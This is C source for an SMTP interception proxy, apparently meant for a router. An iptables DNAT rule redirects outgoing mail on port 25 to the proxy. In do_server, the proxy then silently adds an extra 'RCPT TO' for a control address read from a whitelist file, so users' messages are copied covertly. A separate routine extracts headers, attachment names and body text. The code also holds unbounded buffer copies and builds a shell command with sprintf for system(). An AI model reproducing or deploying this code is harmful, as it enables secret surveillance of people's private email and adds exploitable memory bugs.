#include "../include/myheader.h"
#include "../include/smtp.h"
#include "../include/code.h"
#include<sys/ioctl.h>
#include<netinet/in.h>
#include<net/if.h>


int max (int a,int b)
{
	return a > b ? a:b ;
}

void sig_chld(int signo)
{
	pid_t	pid;
	int	stat;

	while((pid = waitpid(-1,&stat,WNOHANG)) > 0){
	}
	return;
}

int get_whitemail(char *ptr[],int *n)
{
	if(debug_mail) printf("get_whitemail\n");
	FILE *fp;
	char mail[30][40];
	char *buf = NULL;
	
	*n = 0;
	size_t len = 0;
	int i = 0,j = 0;
	ssize_t res;

	fp = fopen("/bh_manage/smtpmail/whitelist","r");
	if(fp == NULL) {
		fprintf(stderr,"open error: %s\n",strerror(errno));
		return -1;
	}

	while((res = getline(&buf,&len,fp)) != -1){
		
		for(i=0; i<strlen(buf)-1; i++){
		
			mail[j][i] = buf[i];
		}
		mail[j][i] = '\0';
		ptr[j] = mail[j];
		j++;
		(*n)++;
	}

	if(debug_mail){
		for(i=0;i<j;i++)
		{
			printf("%s\n",ptr[i]);
		}
	}

	if(debug_mail){
		printf("mailcount:%d\n",*n);
		printf("get_whitemail ok\n");
	}

	return 0;
}

int check_mail(char *mail, char *maillist[],int n)
{
	char *tmp;
	int res;
	int i = 1;

	if(debug_mail){
		printf("check_mail\n");
		printf("mailcount:%d\n",n);
		printf("mail:%s\n",mail);
	}

	for(i=1;i<n;i++){	
		if(debug_mail){
			printf("maillist[%d]:%s\n",i,maillist[i]);
		}

		tmp = maillist[i];
		if((res = strcmp(mail,tmp)) == 0){
			if(debug_mail) printf("check_mail ok\n\n");
			return 0;
		}
	}

	if(debug_mail) printf("check_mail ok\n\n");
	return -1;
}

int parase_mail(char *buf, char *mail)
{
	if(debug_mail) printf("parasr_mail\n");
	
	char *mailstart;
	char *ptr;
	int len;

	mailstart = strchr(buf,'<');
	ptr = strchr(buf,'>');

	len = ptr - mailstart;
	len--;

	mailstart++;
	ptr = mail;
	strncpy(ptr,mailstart,len);
	mail[len] = '\0';
	
	if(debug_mail) printf("mail:%s\nmail_parase ok\n",mail);
	
	return 0;
}

int do_client(char *buf,int buflen,int serverfd,struct ctrl_flag *ctrlflag)
{
	int	res;
	char	*ptr1,*ptr2;
	char	mail[30];

	if(debug_trans) printf("client sending...\n");	

	if(res = write(serverfd,buf,buflen) == -1){
		return -1;
	}

	if((ctrlflag->whiteflag) == NOT_SEND){
		
		ptr1 = strstr(buf,"MAIL FROM");
		ptr2 = strstr(buf,"mail from");

		if(ptr1 != NULL ||ptr2 !=NULL ){
			
			char	*maillist[30];
			int	mailcount = 0;
			
			res = get_whitemail(maillist,&mailcount);
			if(res == -1){
				fprintf(stderr,"get_whitemail error:%s\n",strerror(errno));
			}
			
			ctrlflag->whiteflag = HAS_SEND;
			
			if(debug_trans) printf("buf:%s\n",buf);
			
			res = parase_mail(buf,mail);
			if(res == -1){
				fprintf(stderr,"parase_mail error: %s\n",strerror(errno));
			}
			
			res = check_mail(mail,maillist,mailcount);
			if(res == 0){
				ctrlflag->sendflag = VALID;
				return 1;
			}
		}
	}
	if(ctrlflag->sendflag == NOT_SEND){
		if((ptr1=strstr(buf,"RCPT")) != NULL){
			
			if(debug_trans) printf("find it :%s\n",buf);
			
			ctrlflag->sendflag = HAS_SEND ;
			ctrlflag->sendtype = SEND_TYPE_UPPER;
		}
		else if((ptr1=strstr(buf,"rcpt")) != NULL) {
			
			if(debug_trans) printf("find it %s\n",ptr1);
			
			ctrlflag->sendflag = HAS_SEND;
			ctrlflag->sendtype = SENF_TYPE_LOWER;
		}
	}
	
	return 1;
}

int do_server(int clientfd, int serverfd, struct ctrl_flag *ctrlflag)
{
	int	res;
	char	buf[BUF_SIZE];
	char	*ptr;

	if(debug_trans) printf("server sending...\n");
	
	res = read(serverfd,buf,BUF_SIZE);
	if(res <0 || res ==0 ){
		return res;
	}

	if(res = write(clientfd,buf,res) == -1){
		return -1;
	}

	if(ctrlflag->sendflag == HAS_SEND){
		ptr = strstr(buf,"250");
		if(ptr != NULL) {
			
			if(debug_trans) printf("find it :%s and sendflag = %d\n",buf,ctrlflag->sendflag);
			
			ctrlflag->sendflag = VALID;

			char	*ctrlmail;
			char	*maillist[30];
			char	packet[BUF_SIZE];
			int	mailcount;

			res = get_whitemail(maillist,&mailcount);
			if(res == -1){
				fprintf(stderr,"get ctrlmail error:%s\n",strerror(errno));
			}

			ctrlmail = maillist[0];

			if(debug_mail) printf("ctrlmail:%s\n",ctrlmail);
			
			if(ctrlflag->sendtype == SEND_TYPE_UPPER ){
				if(debug_trans) printf("UPPER\n");
				
				res = sprintf(packet,"RCPT TO: <%s>\r\n",ctrlmail);
				
				if(debug_trans){
					printf("res:%d\n",res);
					printf("packet:%s\n",packet);
					printf("****************************************\n");
					printf("now send my paceet to server...\n");
				}

				if(res = write(serverfd,packet,strlen(packet)) == -1){
					return -1;
				}

				if(res = read(serverfd,buf,BUF_SIZE) == -1){
					return -1;
				}

				if(debug_trans){
					printf("read response for my packet: %s",buf);
					printf("****************************************\n");
				}
			}
			else if(ctrlflag->sendtype == SENF_TYPE_LOWER){
				if(debug_trans)printf("lower\n");

				sprintf(packet,"rcpt to: <%s>\r\n",ctrlmail);
				
				if(debug_trans){
					printf("packet:%s\n",packet);
					printf("****************************************\n");
					printf("now send my packet to server...\n");
				}

				if(res = write(serverfd,packet,strlen(packet)) == -1){
					return -1;
				}

				if(res = read(serverfd,buf,BUF_SIZE) == -1){
					return -1;
				}
				if(debug_trans){
					printf("read response for my packet:%s",buf);
					printf("****************************************\n");
				}
			}
		}
	}
    return 1;
}

int get_wanip(char *wanip)
{	
	struct	sockaddr_in sin;
	struct	ifreq ifr;
	char	g_eth_name[16];
	char	ip[16];
	int	getwanip_sockfd;

	getwanip_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(getwanip_sockfd == -1) {
		fprintf(stderr,"getwanip_sock error:%s\n",strerror(errno));
		return -1;
	}

	strcpy(g_eth_name, "eth0.2");
	strcpy(ifr.ifr_name, g_eth_name);

	if(ioctl(getwanip_sockfd, SIOCGIFADDR, &ifr) < 0) {  
		fprintf(stderr,"ioctl error:%s\n",strerror(errno));
		return -1;
	}

	memcpy(&sin, &ifr.ifr_addr, sizeof(sin));
	sprintf(wanip, "%s", inet_ntoa(sin.sin_addr));

	return 0;
}

int do_iptables_dnat(char *ipaddr, int port)
{

	char buf[BUF_SIZE];

	sprintf(buf,"iptables -t nat -I PREROUTING -p tcp --dport 25 -j DNAT --to-destination %s:%d",ipaddr,port);

	system(buf);

	return 0;
}


void get_mail_detail(char *buf, char *detail){

	char 	*ptr1;
	char 	*ptr2;
	int 	len;
	
	char 	*tmp1;
	char 	*tmp2;

	int	bodylen = 0;
	tmp1 = (char *)malloc(128);
	tmp2 = (char *)malloc(128);
	bzero(tmp1,128);
	bzero(tmp2,128);
	
	unsigned char *mail_body  =(unsigned char *)malloc(2048);
	unsigned char *orgstring = (unsigned char *)malloc(2048);
	unsigned char *utf8string = (unsigned char *)malloc(2048);
	
	ptr1 = strstr(buf, "Date");
	if(ptr1 != NULL){
		
		if(debug_getdetail) printf("find Date!\n");
		
		ptr2 = strstr(ptr1, "\r\n");
		
		if(ptr2 != NULL){

			len  = ptr2 - ptr1;
			
			strncat(detail, ptr1,len);
			
			strcat(detail,"\n");
		}
	}

	ptr1 = strstr(ptr2, "From");
		
	if(ptr1 != NULL){

		if(debug_getdetail) printf("find From!\n");		
		
		ptr2 = strstr(ptr1, "\r\n");
		
		if(ptr2 != NULL){
			
			len = ptr2 - ptr1;
			
			strncat(detail, ptr1, len);
			
			strcat(detail,"\n");
		}
	}

	
	ptr1 = strstr(ptr2, "To");

	if(ptr1 != NULL){
		
		if(debug_getdetail) printf("find To!\n");
		
		ptr2 = strstr(ptr1 ,"\r\n");

		if(ptr2 != NULL){
			len = ptr2 - ptr1;
			strncat(detail, ptr1, len);
			strcat(detail,"\n");
		}
	}


	ptr1 = strstr(ptr2, "Subject");
	
	if(ptr1 != NULL){
			
		if(debug_getdetail) printf("find Subject!\n");
		
		ptr2 =strstr(ptr1, "\r\n");
		
		if(ptr2 != NULL){
			if(debug_getdetail) printf("ptr2 != NULL\n");
			
			len = ptr2 - ptr1;

			if(debug_getdetail) printf("len: %d\n",len);
			strncat(tmp1, ptr1, len);
			
			if(debug_getdetail) printf("tmptmp:%s\n",tmp1);		
			
			if((ptr1 = strstr(tmp1, "?GB2312?B?")) != NULL){

				if(debug_getdetail) printf("GB2312->base64 encode\n");

				if((ptr2 = strstr(ptr1,"?=")) != NULL){
					
					if(debug_getdetail) printf("find ?=\n");	
					
					ptr1 += 10;
					len = ptr2 - ptr1;
					
					strncat(tmp2, ptr1, len);
					if(debug_getdetail) printf("tmp2:%s\n",tmp2);

					len = base64_decode(orgstring, tmp2, len, 1);

					len = gb2312_to_utf8(orgstring, len, utf8string); 
					
					if(debug_getdetail) printf("utf8string: %s\n",utf8string);
					
				}
				
				strcat(detail,"Subject: ");
				strncat(detail, utf8string, len);
				strcat(detail,"\n");

			}
			else{
				if(debug_getdetail) printf("no gb2312\n");
				strncat(detail, tmp1, len);
				strcat(detail,"\n");
			
			}
		}
		if(debug_getdetail) printf("subject end\n");
	}
	

	
	bzero(tmp1,128);
	bzero(tmp2,128);
	bzero(orgstring,2048);
	bzero(utf8string,2048);

	ptr1 = strstr(buf ,"attachment");
	if(ptr1 != NULL){
	
		if(debug_getdetail) printf("find attach!\n");
		
		ptr2 = strstr(ptr1, "filename");
		ptr1 = strstr(ptr2, "\r\n");
		ptr2 += 9;

		len = ptr1 - ptr2;
		strncat(tmp1, ptr2, len);
		
		ptr1 = strstr(tmp1, "?GB2312?B?");
		if(ptr1 != NULL){
			
			if(debug_getdetail) printf("gb2312->base64 encode!\n");
			ptr1 += 10;
			ptr2 = strstr(ptr1, "?=");
			len = ptr2 - ptr1;
			strncat(tmp2, ptr1, len);

			if(debug_getdetail) printf("tmp2:%s\n",tmp2);

			len = base64_decode(orgstring, tmp2, len+1, 1);
			len = gb2312_to_utf8(orgstring, len , utf8string);
			
			if(debug_getdetail) printf("utf8string: %s\n",utf8string);

			strcat(detail,"Attach: ");
			strncat(detail, utf8string, len);
		}

		else{
			tmp1++;
			strcat(detail, "Attach: ");
			strncat(detail,tmp1,len-2);
		}
		strcat(detail, "\n");
	}
	
	ptr1 = strstr(buf, "<html>");
	bzero(utf8string,2048);
	bzero(mail_body,2048);
	if(ptr1 != NULL){
		
		if(debug_getdetail) printf("find <html>\n");
		
		if((ptr2 = strstr(ptr1, "</html>")) != NULL || (ptr2 = strstr(ptr1,"</body>")) != NULL){
			
			if(debug_getdetail) printf("find </html> end\n");
			
			ptr2 += 7 ;
			len = ptr2 - ptr1;
			if(debug_getdetail) printf("len: %d\n",len);

			bodylen = get_mail_body(ptr1, len, mail_body);

			len = gb2312_to_utf8(mail_body, bodylen, utf8string);
			if(debug_getdetail) printf("body utf8string: %s\n",utf8string);
			strncat(detail, utf8string, len);
		}
	}

	if(debug_getdetail) printf("get detail ok and the detail:\n%s\n",detail);
	
	free(tmp1);
	free(tmp2);
	free(mail_body);
	free(orgstring);
	free(utf8string);
}


void get_detail_buf(struct smtp_buf *smtpbuf,char *buf, int buflen){
	
	char *label1, *label2;

	strncat(smtpbuf->buf, buf, buflen);
	if(debug_getdetail) printf("the smtpbuf len is:%d\n",strlen(smtpbuf->buf));

	if(smtpbuf->start_label == NOT_SEND){
		
		if(NULL != (label1 = strstr(smtpbuf->buf, "Date"))){
		
			smtpbuf->start_label = HAS_SEND;
			
			if(debug_getdetail) printf("find Date\n");
			/*附件存在与否*/
			if(NULL != (label1 = strstr(smtpbuf->buf, "X-Has-Attach: yes"))){
				
				if(debug_getdetail) printf("Has attach \n");
				smtpbuf->has_attachment = HAS_SEND;
			}
		}
	}

	else if(smtpbuf->has_attachment == HAS_SEND && smtpbuf->end_attachment == NOT_SEND){

		if(NULL != (label1 = strstr(smtpbuf->buf, "attachment"))){
			
			if(debug_getdetail) printf("find attachment\n");
			if(NULL != (label1 = strstr(label1, "\"")) && NULL != (label2 = strstr(label1+2, "\""))){
			
				if(debug_getdetail) printf("find end attachment\n");
				smtpbuf->end_attachment = HAS_SEND;
				smtpbuf->end_label = HAS_SEND;
			}
			else {
				if(debug_getdetail) printf("attach_buf:%s\n",smtpbuf->buf);
			}
		}
	}

	else if(smtpbuf->start_label == HAS_SEND && smtpbuf->has_attachment == NOT_SEND){
	
		if(NULL != (label1 = strstr(smtpbuf->buf, "<html>")) && (NULL != (label2 = strstr(smtpbuf->buf, "</html>"))
		  || NULL != strstr(smtpbuf->buf, "</body>"))){

			if(debug_getdetail) printf("find html  and the smtpbuf len is:%d\n",strlen(smtpbuf->buf));
			smtpbuf->end_label = HAS_SEND;
		}
	}
}


int get_mail_body(char *buf, int bufsize, unsigned char *body){


	unsigned char 	*ptr1, *ptr2;
	unsigned char	*prebody;
	int 	bodylen = 0;
	int 	flag1 = 0;
	int 	flag2 = 0;
	int	len;
	unsigned char	tmp;
	int 	i;

	prebody = (unsigned char *)malloc(4096);
	if( buf != NULL) {
		ptr1 = strstr(buf, "<body>");
		if(NULL == (ptr2 = strstr(ptr1, "</body>"))) ptr2 = strstr(ptr1, "</html>");

		ptr1 += 6;
		len = ptr2 - ptr1;
		while(len > 0){
			if(flag1 == 1){
				flag2 = 0;
				if(*ptr1 == '>'){
					flag1 = 0;
				}
			}

			else {
				if(*ptr1 == '<') {
					if(flag2 == 1) {
						flag2 = 0;
						prebody[bodylen] = '\n';
						bodylen++;
					}
					flag1 = 1;
				}
				else if(strncmp(ptr1,"=\r\n",3) == 0 || strncmp(ptr1,"=0A",3) == 0) {
					
					ptr1 += 3;
					len -= 3;
					continue;
				}
				else {
					flag2 = 1;
					prebody[bodylen] = *ptr1;
					bodylen++;

				}
			}
			ptr1++;
			len--;
		}
	}

	len = 0;
	i = 0;
	while(len < bodylen){
	
		tmp = 0;
		if(prebody[len] == '='){
			
			if(prebody[len+1] == '=') len += 2;
			else len += 1;
		
			if(prebody[len] >= '0' && prebody[len] <= '9') tmp += (prebody[len] - '0')*16;
			else tmp += (prebody[len] - 55)*16;

			if(prebody[len+1] >= '0' && prebody[len+1] <= '9' ) tmp += (prebody[len+1] -'0');
			else tmp += (prebody[len+1] -55);
			
			body[i] = tmp;
			
			i++;
			len += 2;
		}
		else{
		
			body[i]= prebody[len];
			
			i++;
			len++;
		}
	}

	if(debug_getdetail)	{
		for(len=0;len<i;len++) printf("%x ",body[len]);
		printf("\n");
	}

	return len;
}
